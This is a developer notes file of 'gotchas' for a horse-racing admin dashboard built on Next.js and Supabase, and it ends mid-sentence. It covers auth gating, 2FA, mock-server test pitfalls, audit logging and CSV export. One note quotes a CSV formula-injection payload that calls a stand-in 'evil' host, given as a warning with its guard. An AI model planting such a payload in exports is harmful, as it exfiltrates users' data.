# stablepass-admin — Gotchas

## Every route starts with the admin gate
```ts
const g = await requireAdmin(); if ("res" in g) return g.res; const { sb } = g;
```
`sb` is the caller's RLS client; because they're admin, RLS `*_all_admin` policies apply. Never use a service-role client here.

## Same BFF primitives as stablepass-web
`lib/supabase/server.ts`, `lib/api/envelope.ts` are copied from web — keep them in sync. Envelope + status codes are the contract (403 = non-admin here).

## Race entry is two paths onto one runner
Race-first (`POST /races` → `POST /races/:id/runners`) and horse-first (`POST /horses/:id/races`, find-or-create the event) both end at a `race_horse` row. Results are per-runner (`POST /race-horses/:id/result`), which fans out `race_result` via the be push-dispatch function.

## Media uploads
Video → Mux, image/voice → Storage — the actual upload/watermark is orchestrated by the be side / Storage SDK; the admin route records the resulting ids/urls.

## Tests are the pass/fail
Each route ticket needs a test asserting the 403-for-non-admin branch + the happy-path status/envelope.

## Mockups path drifts from .rx/mockups.md
`.rx/mockups.md` says `../docs/dev-handover/mockups/web/admin/`, but the real screens live at
`../dev-handover/StablePass-mockups/mockups/web/admin/screens/` and the shared design system is
`../dev-handover/StablePass-mockups/mockups/web/style.css` (same tokens as member web). Build FE from
that file; pull real values (`--brand-green:#285D50`, `--brand-green-darker:#122E26`, `--cream:#FAF7F2`,
Inter/Cormorant) rather than eyeballing.

## ~~The admin sign-in mockup is stale on 2FA~~ — REVERSED by ENG-370: the MOCKUP was right
**This entry used to say "build email+password only, 2FA is out of scope in v1". That is now wrong —
2FA shipped.** `screens/01-signin.html`'s "Authenticator code" field and its
"Protected by 2FA · Staff sessions audited" legal line are both real requirements. Do **not** delete
the code step or revert the legal line to match an older doc.

What actually shipped (ENG-370), because the mockup's *single form* still isn't buildable:
- **Two steps, two screens.** `/signin` = email + password (button: **Continue**); `/signin/mfa` =
  the 6-digit code. Supabase must mint the AAL1 session from the password **before** a TOTP code can
  be verified, so one submit would mean holding the password server-side.
- `/signin/mfa` reuses `.admin-signin` / `.admin-signin-card` and the mockup's own code-field styling
  verbatim. `app/globals.css` needed **no** new classes.
- `"/"` is reachable only at **aal2**. `requireAdmin()` 403s (`mfa_required`) an AAL1 admin;
  `requireAdminPage()` redirects to `/signin/mfa` (or `/signin/mfa-setup` when nothing is enrolled).

## First FE ticket bootstraps the toolchain (done in ENG-173)
The scaffold ships **no test runner and no design system**. ENG-173 added: vitest (`npm test` =
`vitest run`), the shared design tokens installed into `app/globals.css` with fonts wired via
`next/font` (Inter + Cormorant → `--font-inter`/`--font-cormorant`), and a Playwright screenshot
harness under `e2e/` that stands up a **mock Supabase HTTP server** (`e2e/mock-supabase.mjs`) so the
gated flow renders without a live backend (`npm run e2e`). `e2e/**` + `playwright.config.ts` are in
`tsconfig` `exclude` so the app gate never depends on Playwright types.

## The gated dashboard is the `(dash)` index → `/`, so delete the scaffold home
`app/(dash)/page.tsx` resolves to `/`. The create-next-app `app/page.tsx` also resolves to `/` — two
pages on one route is a build error, so the scaffold `app/page.tsx` + `page.module.css` must be removed
when the `(dash)` group lands.

## Page gate vs API gate — two functions in lib/auth/admin.ts
`requireAdmin()` returns a 401/403 **Response** (for `app/api/admin/*` route handlers).
`requireAdminPage()` **redirects** (`/signin`, or `/signin?error=forbidden` for a non-admin) because a
Server Component / layout can't return a Response. Both read `app_user.is_admin` via `getUser()` (not
`getSession()`) and fail closed (`!data?.is_admin`, so a missing row is denied).

## `(dash)` layout gate does NOT gate a page's own data fetch
The `(dash)` shell gate in `layout.tsx` is airtight for a static page, but Next renders layout + page
**in parallel** and caches the layout across soft navigations — it won't re-run per page. Any
data-bearing `(dash)` page (ENG-174 dashboard, resource screens) must re-assert `requireAdminPage()` /
gate its own reads (or rely on RLS `*_all_admin`), not lean on the layout alone.

## Admin API routes ship as T1 scaffold stubs — flesh them out in place
Routes like `app/api/admin/posts/**` already exist in the base branch as stubs with a
`// TODO(ticket):` marker and a placeholder body (`return ok({ id, action })`). An endpoint ticket
(e.g. ENG-175/T5) edits those files in place, not greenfield — read the stub first and keep the
`requireAdmin` preamble.

## `api-contract.md` POST /posts row is stale (multipart + asset ids)
The doc lists `POST /api/admin/posts` as `multipart` in with `muxAssetId/muxPlaybackId/mediaUrl` in the
response. The guardrail-correct **direct-upload** flow (bytes never transit our server) is **JSON in →
202 with an upload target out**: video `{ uploadUrl, muxUploadId }`, photo
`{ uploadUrl, path, token, bucket }`. Mux asset/playback ids don't exist until *after* the client's
direct upload (a webhook, later). T6 Compose must send JSON then PUT the bytes to the returned target.
A `502 storage_unavailable` code (photo path) was added alongside the doc's `mux_unavailable`.

## push-dispatch is invoked with the admin session, not a service-role secret
Publish/result fan-out calls `sb.functions.invoke("push-dispatch", …)` on the caller's RLS client — the
edge function holds service role internally (T2). The admin BFF never imports a service-role key. Keep
the fan-out best-effort (wrap in try/catch) so a notify failure never rolls back the status transition.

## No Mux SDK dependency — use the REST API
`lib/mux.ts` creates a direct upload via `fetch` to `https://api.mux.com/video/v1/uploads` with a
Basic-auth header from `MUX_TOKEN_ID`/`MUX_TOKEN_SECRET`; `playback_policy: ["signed"]`. Don't add
`@mux/mux-node` — it isn't in package.json and isn't needed for upload-URL creation.

## Route unit tests: mock `@/lib/supabase/server`, not the gate
`requireAdmin()` calls `supabaseServer()`, so `vi.mock("@/lib/supabase/server")` drives both the gate
(`app_user.is_admin`) and the route's own reads/writes from one fake. `lib/testing/supabase-fake.ts` is
a reusable scriptable client (per-table `select` vs `mutate` results, `functions.invoke`,
`storage.createSignedUploadUrl`) — reuse it for the other admin route tickets.

## Mockups live OUTSIDE the repo — real path differs from `.rx/mockups.md`
`.rx/mockups.md` writes the source as `../docs/dev-handover/mockups/web/admin/`, but the files actually
sit at `<repo>/../dev-handover/StablePass-mockups/mockups/web/admin/screens/` (and the shared design
system at `.../mockups/web/style.css`). Resolve with `find … -name '<NN>-*.html'` rather than trusting
the manifest path. Build live from the HTML + `style.css` (real token values), not from memory.

## A resource LIST screen needs no GET endpoint — Server Component reads via `supabaseServer()`
The admin list pages are Server Components under `app/(dash)/<res>/page.tsx` that query the RLS admin
client directly (gated by the layout). So a list ticket's surface may legitimately declare only the
mutation routes (e.g. ENG-179 trainers owns `POST/PATCH`, no `GET`). Keep data-fetching in a small
injectable helper (`app/(dash)/<res>/data.ts` taking `sb`) so it's unit-testable against the fake, and
use flat per-table queries + JS merge for derived columns (horse count, last-post, contact email) —
PostgREST embedding can't be verified here (no live backend), flat selects can.

## Screenshot a data-backed `(dash)` screen: extend the mock-Supabase harness
`e2e/mock-supabase.mjs` (from ENG-173) serves GoTrue + `app_user`. To screenshot a list/detail screen,
add PostgREST reads for its tables + a `POST /__control {empty}` toggle so one spec captures both the
populated and empty states (see ENG-179's trainer/horse/post/trainer_contact seed). The spec signs in
via the form, flips `/__control`, `goto`s the route, waits on a `data-testid`, and screenshots
`fullPage`. No live backend needed. Reuse this for horses (T8) and any future resource screen.

## e2e mock must honour `id=eq.` for `.maybeSingle()` single-row reads
This repo's `@supabase/postgrest-js` `.maybeSingle()` does NOT set the `pgrst.object` Accept header — it fetches as a
**list** and enforces cardinality client-side (errors → `data=null` if >1 row comes back). So a mock
(`e2e/mock-supabase.mjs`) that returns the whole fixture array for every `/rest/v1/<table>` GET makes a
`.eq("id",id).maybeSingle()` page read (e.g. the horse edit page) see N rows, null out, and hit `notFound()`. Do-this:
in the mock, branch on `url.search.includes("id=eq.")` and return the single matching fixture (object for `pgrst.object`,
singleton array otherwise). A PK-filtered `.maybeSingle()`/`.single()` is fine against a real DB (0/1 row) — this only bites the mock.

## Admin resource-screen component classes aren't in globals.css yet
ENG-173 ported only tokens + shell + buttons/inputs into `app/globals.css`. The resource-screen classes the mockups use
(`.adm-card`, `.chip`, `.pill`, `.horse-grid-adm`/`.horse-card-adm`, `.upload-zone`, `.btn-light`, `.adm-filter-bar`,
`.search-mini`) live only in the shared mockups `style.css`. Since `app/globals.css` is usually NOT in a screen ticket's
surface, ENG-178 (horses) scoped them into `app/(dash)/horses/horses.css` (imported by its pages) with values ported
verbatim from `style.css`. The next resource screen (trainers) will re-need a few — either promote the shared ones to
`globals.css` via a `shared-surface` ticket, or keep scoping per screen (duplicate CSS is harmless).

## `horse.status` (active/disabled) = visibility; `horse.training_status` = the phase
The add/edit "Visibility" select maps to `horse_status` (`active`=Visible, `disabled`=Hidden); the "Current status"
select maps to `training_status` (spelling…racing…retired). The list filter chips are training-status based: **Active =
`training_status != 'retired'`**, Racing = `'racing'`, Retired = `'retired'` (Active+Retired partition All; Racing ⊂
Active). `trainer_id` is **fixed for life of row** (schema note) — the edit route's allowlist omits it and the edit form
disables the trainer dropdown.
## Horse/trainer LISTS have no BFF endpoint — read them server-side ([PG])
`app/api/admin/horses/route.ts` + `trainers/route.ts` are **POST-create only**; there is no GET list.
Per `screen-api-map.md`, listing is Layer A `[PG] GET horse`/`trainer`. Elevated admin reads need the
session, which lives in **httpOnly cookies** — so the **browser** client (`supabaseBrowser`, anon) can't
do them. Read horse/trainer **server-side** in the page via `requireAdminPage()`'s `sb` and pass as
props (T6 Compose does this). The browser client is only good for token-authorized ops (Storage
`uploadToSignedUrl`), not RLS-gated table reads. Field mapping: horse name = `racing_name ?? display_name`;
byline default = `horse.trainer_id`; embed the trainer with `trainer:trainer_id(id,name,display_name)`.

## Post shape: it's `type` + `body`, not `media_kind` + `caption`
`post.type in ('video','photo','text','voice','news')` (compose creates video/photo only); the caption
is `post.body`; the byline is `post.source_trainer_id`. Create (`POST /api/admin/posts`) accepts
`{horseId,type,sourceTrainerId,title?}` and does **not** take the caption — set `body` afterwards via
`PATCH /api/admin/posts/:id {body, sourceTrainerId}`.

## FE screens need a CSS module — globals.css only carries the shell subset
`app/globals.css` has tokens + buttons + `admin-shell`/`admin-nav`/`admin-topbar` only. The compose /
form / member-post classes (`compose-grid`, `upload-zone`, `adm-input`, `.pill`, `.btn-light`,
`post-web`…) are **absent**. Don't edit globals.css from a screen ticket (collides with sibling screens);
port the needed rules into a scoped `*.module.css` inside the screen's own surface, referencing the
global `:root` tokens. Combine a global base class with a module modifier in JSX
(`className={`btn ${styles.btnLight}`}`).

## Component tests: repo ships no jsdom/testing-library — add per test
`vitest.config.ts` is `environment: "node"`. For a `renders`-style component test add devDeps
`@testing-library/react` + `jsdom` and put `// @vitest-environment jsdom` at the top of the `.test.tsx`.
Extract the network layer into a sibling `api.ts` and `vi.mock("./api")` so the component test never
touches fetch/Supabase/Mux. `URL.createObjectURL` is absent in jsdom — guard it in the component
(`typeof URL.createObjectURL === "function"`), don't assume it.

## Screenshots: `next start`, not `next dev`; mock server-reads, route browser-calls
Dev-mode Turbopack compile + Chromium can OOM a 16 GB box mid-run. Build once (`npm run build`) then
screenshot against `next start -p 3002` — far lighter. For a screen with server-side `[PG]` reads,
extend `e2e/mock-supabase.mjs` (the Next server hits :8787, so Playwright `page.route` can't intercept
those); for browser-side BFF/Storage calls (create-draft, signed-upload PUT), use `page.route` in the
spec so you don't touch the shared mock. Both are additive/collision-safe.

## `e2e/mock-supabase.mjs` now has a GENERIC DB handler that shadows post/horse (ENG-179)
Trainers (ENG-179) replaced the per-table mock fixtures with an in-memory `DB` + a catch-all
`if (GET && startsWith('/rest/v1/') && hasOwnProperty(DB, table)) return DB[table]`. `DB` holds
`trainer/horse/post/trainer_contact`, so that one handler now **shadows `/rest/v1/post` and
`/rest/v1/horse` for every screen** — a later screen's server reads of those tables silently get
trainer-shaped rows (no `horse_id`/`title`/`status`). Fix: put the new screen's `/rest/v1/post` +
`/rest/v1/horse` handlers **before** the generic one and disambiguate by the screen's own query
filters — the dashboard (ENG-174) keys on `status=eq.published` (post) and `status=eq.active` (horse);
trainers' reads carry neither, so they fall through untouched. Be HEAD-aware for `head:true` count
queries: emit a `Content-Range: 0-N/TOTAL` header (see `sendTable`) or `count` comes back null and the
tiles render 0. This file is a cross-ticket hotspot — expect to reconcile it on every screen rebase.
## mock-supabase.mjs now has a GENERIC `/rest/v1/<table>` dispatcher — it shadows resource handlers
T9 (trainers) added a `startsWith("/rest/v1/")` handler backed by a `DB` object (`{trainer,horse,post,
trainer_contact}`) built from a trainer seed, flipped populated↔empty via `POST /__control {empty}`. It
runs **before** the older per-resource handlers, so it silently serves ALL `/rest/v1/<table>` GETs whose
table is a `DB` key — including `post` (as trainer "last-activity" stubs: `{source_trainer_id,
published_at,created_at}`, **no `status`**). A new resource screen that adds its own `/rest/v1/<table>`
handler AFTER the dispatcher never runs and gets those stubs instead (symptom: SSR `Cannot read
properties of undefined (reading 'label')` because rows lack the fields you map). Fix: place your
handler **before** the generic dispatcher and **guard it** on a query-string discriminator unique to
your screen's read (posts library selects `status`; the trainers post read selects only
`source_trainer_id,published_at,created_at`) so you don't hijack the other screen's same-path read. Set
`Content-Range: start-end/total` for `count=exact` list reads (postgrest-js reads the total from it).

## The integration base can advance WHILE you build — rebase before you PR
`feature/admin-dashboard-v1` is shared; a sibling ticket (e.g. T9) can merge mid-build, moving the tip
past your branch point. `git worktree` shares refs, so a sibling's `git fetch` updates your
`origin/<base>` too. Before opening the PR: `git fetch && git rebase origin/feature/admin-dashboard-v1`,
then re-run the FULL gate (a shared file like `e2e/mock-supabase.mjs` can merge cleanly by text yet
collide at runtime — see the dispatcher gotcha above).

## Client-effect UI (`LocalTime`) renders EMPTY under `next dev` in Playwright — another reason to `next start`
Reinforces the "screenshots: `next start`, not `next dev`" note above, with a distinct symptom. A
component that fills its content in a post-mount `useEffect` (the `LocalTime` SSR-safe pattern from
ENG-251: empty `<time>` server-side, label filled after hydration) shows **permanently blank** when
Playwright drives `npm run dev` — the element keeps its `datetime`/attrs but `textContent` stays `""`
the whole run, and the only console noise is `ws://…/_next/webpack-hmr … WebSocket handshake:
net::ERR_INVALID_HTTP_RESPONSE`. Cause: in the e2e sandbox the dev HMR WebSocket handshake fails, Fast
Refresh never finishes initialising the client runtime, so effects never fire. It is a **dev-only
artifact** — against `next build && next start` hydration completes and labels fill correctly. Don't
mistake the blank labels for a real bug; verify against the prod build. Point Playwright's
`webServer.command` at `npm run build && npm run start -- -p <port>` (raise `timeout` to ~240s). Port
note: the shared checkout often already holds 3002 with the human's dev server (serving `main`, not your
branch) — screenshot YOUR branch via a temp, untracked `pw.*.config.ts` on a free port.

## `lib/testing/supabase-fake.ts` had no `.rpc()` — any RPC-backed route ticket must add it (ENG-275)
The fake only modelled `from()/auth/functions/storage`, so the first ticket to call `sb.rpc(...)` (ENG-275
analytics) couldn't unit-test at all. Extended additively: `FakeState.rpcs: Record<string,{data?,error?}>`,
`calls.rpc: {name,args}[]`, and an `rpc()` method on `makeFakeClient`. **Caveat:** an *unregistered* rpc name
returns `{data: [], error: null}`, so a test asserting only "we passed `p_since: null`" would still pass with a
WRONG function or argument name — it only proves what the client sent. Pin the mapping with a `toEqual` on the
full response shape, and smoke-test RPC names against a real DB before merge.

## Route tickets consuming another repo's RPCs: read the MERGED migration, don't infer
ENG-275's contract depended on 9 RPCs from ENG-273 in `stablepass-be`. The local `stablepass-be` checkout's
`supabase/migrations/` does NOT show them (they were on `feature/analytics-v1`, not main). Do-this:
`git -C ../stablepass-be fetch origin && git show origin/feature/<epic>:supabase/migrations/<file>.sql` and read
the `returns table (...)` blocks for the exact column names. Reviewers flagged the RPC layer "UNVERIFIED" because
they only see this repo — pre-empt it by quoting the migration evidence in the PR.

## `count`-style analytics fields need a real per-row scope or they're a global constant
ENG-275 first computed a post's `reach` as "all `trial|active` subscriptions" — identical for every post, making
`opens/reach` meaningless. The right source is the admin-readable `follow` table
(`follow(user_id, trainer_id, horse_id)`, `follow_no_duplicate unique(user_id,trainer_id,horse_id)` so a count is
already distinct-by-user, policy `follow_select_admin`): `reach = count(follow where horse_id = post.horse_id)`.
Check for a `follow`/join table before falling back to a global count.

## Table reads that ignore `error` turn an RLS regression into "no data"
`const rows = res.data ?? []` on an admin read renders a permission denial as a legitimately-empty list, and
`if (!data) return null` turns a failed query into a 404. Both hide a broken policy. Use an
`unwrap(res, what)` that throws on `res.error` for EVERY table read, and keep the genuine not-found branch after
it. Then catch at the route and return `fail("query_failed", "<generic>", 500)` — never `e.message`, which would
leak Postgres schema/SQL text to the client.

## Any CSV export of member-supplied text needs a formula-injection guard
RFC4180 quoting is NOT a mitigation: Excel/Sheets strip the quotes then evaluate a leading `=`, `+`, `-`, `@`,
tab or CR. A member-supplied `name` of `=HYPERLINK("http://evil"&A1,"x")` exfiltrates the export on one click.
Prefix any such cell with an apostrophe *before* applying the quoting rules (see `lib/analytics/csv.ts`).

## Mutation-test the analytics mappers — `toMatchObject` and fixture-shaped tests hide real gaps
On ENG-275 three behaviours survived mutation with a green suite: all `Number()` coercion deleted, the
array-shaped PostgREST embed branch stubbed to `null`, and `daysLeft` hardcoded to `-999`. Causes: fixtures used
JS numbers (never exercising the string-bigint path PostgREST can return), the array-embed fixture asserted only
the CSV header row, and `daysLeft` was never asserted. Use `toEqual` (not `toMatchObject`) on any PII payload so
a new leaked field fails, and assert derived fields explicitly including the edge case (an expired trial must be
`0`, not negative).

## e2e ran `next dev` despite the gotcha above — client screens were INERT (ENG-285)
`playwright.config.ts` had drifted to `command: "npm run dev -- -p 3002"` while the "Screenshots:
`next start`, not `next dev`" gotcha above said otherwise. Under the dev server the client bundle
never finished hydrating: every `"use client"` screen rendered its SSR markup but stayed dead — no
console error, no failed request, so it looks like a data bug. Symptom: compose's horse picker never
opened; the tell is that the caption counter stays at `0/240` while you type. Do-this: keep the
webServer on `npm run build && npm run start -- -p 3002` (timeout 300000). To decide "not hydrated"
vs "no data" in 30s, type into a control with a React-driven counter and watch whether it moves.

## Discriminate mock handlers on the query string EXACTLY — and beware a second shadowing pair
Extending the dispatcher gotcha above with what ENG-285 actually hit:
* **Two handlers can both claim one read.** Compose's horse read filters `status=eq.active`, the same
  discriminator the dashboard handler used — so the dashboard branch swallowed it and returned rows
  with no embedded `trainer`. When you add a branch, check no EARLIER branch already matches its
  query. All `/rest/v1/horse` branches now live in one ordered block for that reason.
* **Match the table name exactly, not by prefix.** `startsWith("/rest/v1/horse")` also catches a
  future `horse_*` table (`startsWith("/rest/v1/race")` already mis-captures `race_horse`, and
  `/rest/v1/trainer` catches `trainer_contact`). Use `url.pathname === "/rest/v1/<table>"`.
* **A catch-all fallback hides broken branches.** A fallback serving the good fixtures keeps the suite
  green even when the branch above it is broken — a mutation test proved it absorbed the break
  silently. Keep the fallback (it stops stub rows leaking) but make it `console.warn` loudly.

## A visibility-only e2e assertion proves nothing about content
`expect(page.locator(".horse-card-adm").first()).toBeVisible()` passed against 24 EMPTY cards for two
epics. Assert content (a fixture name, the trainer, the expected row count), not just presence — and
verify the assertion by mutation: break the mock deliberately, confirm the suite goes red, restore.
## mock-supabase discriminators: ANCHOR the filter and DECODE the search (ENG-276)
Two ways a new `/rest/v1/<table>` handler silently hijacks another screen, both hit on ENG-276:
1. **Unanchored filter.** `url.search.includes("id=eq.")` is ALSO true for `horse_id=eq.` — so a
   by-PK handler steals the posts library's horse-filtered list read (and its chip-count query), which
   then renders empty with all-zero counts. Use `/[?&]id=eq\./` and extract with the same anchored
   pattern, or the regex pulls the *horse* id out of `horse_id=eq.<uuid>`.
2. **`url.search` is PERCENT-ENCODED.** A PostgREST embed alias arrives as `trainer%3Asource_trainer_id`,
   so a raw `includes("trainer:source_trainer_id")` never fires and the handler is dead code — the read
   falls through to the generic dispatcher and returns wrong-shaped rows. `decodeURIComponent(url.search)`
   before any select-signature test.
Also: an embed alias is rarely unique. `trainer:source_trainer_id` is used by the posts library, the
posts API route, the preview route and dashboard queries; only the full `(name,display_name)` arg list
is analytics-only. Grep every caller before keying on a select fragment.

## Charts: hand-rolled inline SVG, no library — geometry belongs in a pure module
ENG-276 built the analytics charts as inline SVG matching the mockups' 420x150 viewBox (grid at
y=20/70/120, bars up from y=120, axis labels at y=136). Keep the maths in a pure `chart.ts`
(`barLayout`/`lineLayout`/`axisTicks`) so it unit-tests without a DOM, and guard the two cases real
data hits immediately: `max === 0` (a new platform) would make every ratio NaN, and an exact-zero bar
should render height 0 — a hairline stub reads as real data. Axis labels must be SHORT: 12 labels on a
420-unit viewBox clip at the edges, so put the long form in a `<title>` tooltip instead.

## The analytics BFF has no prior-period query
`getOpens/getEngagement/getClicks` take a single `since`; `getTrials()` takes none at all. So the
mockup's "+18% vs prior 30 days" tile deltas are NOT computable, and Subscribers/On-trial are
point-in-time counts that do not move with the period toggle. Don't fabricate a delta to match the
mockup — label honestly ("as of today") and raise a follow-up for a prior-period query.

## `page.screenshot({path})` OVERWRITES its baseline — e2e asserts nothing visual
The specs under `e2e/` capture *to* the committed PNG, so the suite passes regardless of visual
regression and `npm run e2e` always leaves a dirty tree. Two consequences:
1. **Never blanket-commit regenerated PNGs** — a blanket refresh is what got PR #18 rejected first
   time round. Justify any baseline you do commit, individually.
2. **A visual fix needs a non-visual guard.** The `gap={26}` trials-bar fix (AnalyticsScreen.tsx)
   had none: `barLayout(series, gap = 5)` takes gap as a DEFAULTED param, so a `chart.ts` unit test
   passes on the broken code — the defect was that no CALLER passed one. Only the rendered `rect`
   width proves it. See the "bar geometry" block in `AnalyticsScreen.test.tsx`; mutation-verify any
   replacement (drop `gap={26}` → must fail `expected 65 to be 44`).
   Assert the *expression* (`420 / 14 - 5`), not a literal, for charts that ride the default — the
   mockup draws 24 where we render 25, so a literal pins a known off-spec value and cries wolf.

## Which e2e baselines churn on every run (do NOT read these as regressions)
- `02-dashboard.png`, `02-dashboard-shell.png`, `10-post-analytics.png` — fixtures in
  `e2e/mock-supabase.mjs` are `Date.now()`-relative (+2h/+4h/+6h), so these differ on every capture.
- `05-horses-list.png` — churns too, and is easy to mistake for a real diff because it is ~5x larger
  (~3.2k px). It is a 1px vertical text-baseline jitter confined to the single "Winx" card
  (bbox x 520-741, y 473-764); content, data and layout are identical. Renderer nondeterminism.
Quantify before judging: `magick compare -metric AE old.png new.png /tmp/d.png`, then crop the bbox
and look. Don't eyeball full-page shots.

## `06-compose-preview.png` is committed in an UNPAINTED state
The preview modal is screenshotted before its blob-URL `<img>` elements decode, so the baseline shows
`.postMedia`'s brand-green-dark background instead of the photos. Reproduces deterministically under
`next start` (the old `next dev` harness's extra latency hid it). Harness timing, NOT a product bug —
but the committed baseline is misleading evidence. Fix when touched: `await img.decode()` + a double
`requestAnimationFrame` before the shot in `e2e/compose.spec.ts`.

## Gate tickets: check the integration branch's own ancestry before PR-ing to main
`stablepass-be`'s `feature/analytics-v1` turned out to be `feature/member-api-v1` + ONE commit, and
member-api-v1's gate PR was still open — so an analytics-v1 → main PR silently carries the whole of
the other epic (5.4k lines). Run `git merge-base --is-ancestor origin/feature/<other> HEAD` and
`git log --oneline origin/main..HEAD` before opening a gate PR, and put the merge-order call at the
TOP of the body. `git diff --stat` alone will badly mislead you about what a gate PR contains.

## `getAuthenticatorAssuranceLevel()` decodes the access token as a REAL JWT
auth-js's no-argument path calls `decodeJWT(session.access_token)`, which throws
`AuthInvalidJwtError` unless the token is exactly 3 base64url parts. `e2e/mock-supabase.mjs`'s old
`FAKE_ACCESS_TOKEN = "fake-access-token"` therefore made every aal read blow up. The mock now mints a
structurally valid unsigned JWT carrying an `aal` claim (`jwt("aal1")` / `jwt("aal2")`, signature
segment is the literal `"sig"` — the client never verifies it) and flips `currentAal` on a successful
verify. Related: `mfa.listFactors()` does **not** call a factors endpoint — it reads `user.factors`
off `GET /auth/v1/user`, and only `status:"verified"` entries land in the `totp` bucket.

## The admin audit trail has TWO RPCs and the wrong one fails SILENTLY
stablepass-be (ENG-369) ships `log_admin_signin_fail(p_email,p_ip,p_user_agent)` — anon-callable, event
hard-coded — and `log_admin_auth_event(p_event,…)` — authenticated/service_role only, **with an in-body
guard**. Call the general one without a session and it inserts **zero rows and still returns 204**. So:
- a **failed password** must use `log_admin_signin_fail` (no session exists at that moment);
- `mfa_fail` (and the valid-password-non-admin `signin_fail`) must be logged **BEFORE** `signOut()`.
Pin the ordering with an ordered trace array (`expect(trace).toEqual(["rpc:mfa_fail","signOut"])`), not
`toHaveBeenCalled` — a `toContain` assertion passes with the lines swapped.

## `p_ip` is `inet`: a PARTIAL IPv6 raises 22P02 from the ARGUMENT CAST
The cast runs *before* the function's never-raise body, so a bad value silently loses the audit row.
`X-Forwarded-For` is routinely a list (`client, proxy1, proxy2`) — never forward it raw. The subtle
trap is partial IPv6: `1:2`, `:`, `:::`, `abcd:`, `0:0`, `1:2:3` all *look* like addresses and are all
rejected by Postgres. Validating only the group **count** (`<= 8`) is not enough — require exactly 8
groups unless a single `::` is present, reject stray leading/trailing colons, and accept an IPv4 tail
(`::ffff:192.0.2.1` is the routine dual-stack form). Since XFF is client-supplied, a loose parser lets
an attacker suppress their own `signin_fail` rows with one header. See `lib/audit.ts#parseIp`.

## postgrest-js RESOLVES with `{error}` — a bare try/catch around `.rpc()` is dead code
`await sb.rpc(...)` does not reject on a PostgREST error (only `.throwOnError()` does), so wrapping an
audit/fire-and-forget RPC in `try/catch` catches nothing that actually happens: a 22P02 bad cast, a
renamed function (PGRST202), a revoked grant and a real success all look identical. Inspect `error` and
`console.warn` it; keep the never-rethrow contract. This is the write-side twin of the existing
"table reads that ignore `error` turn an RLS regression into 'no data'" note.

## Touching the admin gate breaks the SHARED test fake + every inline e2e sign-in
Two cross-cutting consequences to budget for when `lib/auth/admin.ts` gains a condition:
1. `lib/testing/supabase-fake.ts` backs ~30 `app/api/admin/**` route tests. A new `sb.auth.*` call the
   fake doesn't implement becomes a `TypeError`, the gate fails closed, and every route test 403s.
   Add the stub and default it to the PASSING value (`aal: "aal2"`) so existing tests keep their
   intent — then add ONE dedicated test that drives the failing branch through a real route handler
   against a POPULATED table (`lib/auth/admin-aal2-route.test.ts`), or the new branch is untested.
2. Six e2e specs (`analytics/compose/dashboard/horses/posts/trainers`) each carry their own inline
   `signIn()` helper. Changing the sign-in flow or the submit button's label breaks all six at once.

## `lib/audit.ts`'s `AdminAuthEvent` union omits `mfa_enrolled` (ENG-371)
The file's own header reserves it ("`mfa_enrolled` is A2's") and the RPC's check constraint accepts
it, but the exported union is only `signin_ok|signin_fail|mfa_ok|mfa_fail`. A2 could not edit
`lib/audit.ts` (A1's surface), so it bridges with `const MFA_ENROLLED = "mfa_enrolled" as
AdminAuthEvent` at the call site. Harmless — `logAdminAuthEvent` only forwards the string as
`p_event`, no switch/exhaustiveness — but **widen the union** when A1's file is next touched, and
don't "fix" the cast by writing a second audit wrapper.

## Don't gate `/signin/mfa-setup` with `requireAdminPage()` — it redirects TO that route
`requireAdminPage()` sends an AAL1 admin with `hasFactor === false` to `/signin/mfa-setup`, so using
it to gate that page is an infinite redirect. The enrolment page must do the checks inline (no
session → `/signin`; non-admin → `/signin?error=forbidden`; verified factor → `/` at aal2 or
`/signin/mfa` at aal1). The A1↔A2 pair is loop-free because both key off `factors.totp` with
opposite polarity, and A1's page only bounces back on a POSITIVE zero-factor read (`!error &&`).
Same shape applies to any future "you must do X before continuing" screen the gate redirects to.

## `lib/testing/supabase-fake.ts` defaults `aal` to `"aal2"` — and models no `auth.mfa.*`
ENG-370 added `aal: "aal1"|"aal2"` defaulting to **"aal2"** so pre-existing route tests kept passing.
Any test of an AAL1 path that forgets to set it exercises the wrong branch and passes for the wrong
reason — set it explicitly. The fake also has no `mfa.enroll/unenroll/listFactors/challengeAndVerify`
and no `signOut`, so MFA-flow tests hand-roll their own `vi.mock("@/lib/supabase/server")` (see
`app/signin/mfa/actions.test.ts` and `app/signin/mfa-setup/*.test.ts`).

## A query-builder mock that swallows its arguments cannot see an IDOR
`from: () => ({select: () => ({eq: () => ({single: ...})})})` makes `.eq("id", user.id)` and
`.eq("id", "anyone-else")` indistinguishable — a self-review mutation to a stranger's row left the
suite fully green. Record the filter (`state.reads.push(`${table}.${col}=${val}`)`) and assert it.
Keep it in a SEPARATE array from the side-effect trace so "no write happened" assertions
(`expect(trace).toEqual([])`) still mean what they say.

## Guard the PAYLOAD of a Supabase call, not just its `error`
`e2e/mock-supabase.mjs`'s catch-all answers **`200 {}`** for any unhandled route (not 404), so a
missing endpoint yields `{data: {}, error: null}` — a shape that passes an `if (error)` check and
then throws on the first property access. `mfa.enroll` guarded only on `error` would 500 the one
screen an admin cannot route around. Guard the field you're about to read
(`enrolled?.totp?.qr_code ? … : null`) and unit-test that third shape — `{data:null,error}` does NOT
cover it.

## `e2e/mock-supabase.mjs` has the CHALLENGE half of the MFA API but not the ENROL half
It serves `POST /auth/v1/factors/:id/{challenge,verify}` and its `ADMIN_USER` always carries a
*verified* factor, so no session it mints can reach a "nothing enrolled" state. There is no
`POST /auth/v1/factors` and no `DELETE /auth/v1/factors/:id`. ENG-371 therefore e2e-tests only the
redirect branches and captured its screenshots against a throwaway copy of the mock in a scratchpad
(own port + `pw.capture.config.ts`, both deleted after). Add the two endpoints to the shared mock
when someone owns that file.

## auth-js prepends the `data:` prefix to `qr_code` itself — don't send a complete data-URI
`GoTrueClient._enroll()` does ``data.totp.qr_code = `data:image/svg+xml;utf-8,${data.totp.qr_code}` ``.
A mock returning an already-complete `data:image/svg+xml;utf-8,<encoded>` gets double-prefixed into a
broken image. The mock's `qr_code` must be **just the percent-encoded SVG**. Also: `listFactors()`
buckets only `status === "verified"` into `totp`; `all` holds the unverified ones too.

## Run mutation-testing reviewers ONE AT A TIME per worktree
Two `rx:review` agents mutation-testing the same worktree concurrently corrupted each other's
readings (one observed `signOutCalls === 2` because the other's identical mutation was live). Both
recovered, but serialize them — or give each a private copy — or a crash mid-mutation leaves the
tree dirty.

## Vitest STUBS CSS modules — a render test can never prove a stylesheet fact
`css: false` (the default) makes `import styles from "./x.module.css"` a proxy that returns the key,
so `styles.postCard === "postCard"` and `getComputedStyle` sees nothing. A ticket whose acceptance
